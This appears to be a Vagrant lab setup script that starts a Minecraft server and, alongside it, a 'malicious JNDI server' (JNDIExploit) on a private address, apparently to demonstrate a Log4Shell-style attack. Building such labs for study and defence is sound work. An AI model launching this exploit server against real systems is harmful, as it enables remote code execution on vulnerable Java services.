#!/bin/bash
echo 'starting minecraft server in the background'
screen -d -m -S game bash -c "java -Xms2G -Xmx2G -jar ./server.jar --nogui && sed -i 's/false/true/' ./eula.txt && java -Xms1G -Xmx1G -jar ./server.jar --nogui"
echo 'starting malicious JNDI server in background'
screen -d -m -S killbox bash -c "cd /home/vagrant/exploit; java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.30.1.5 -p 8888"    
echo 'DONE - LAUNCH the VM using provider gui'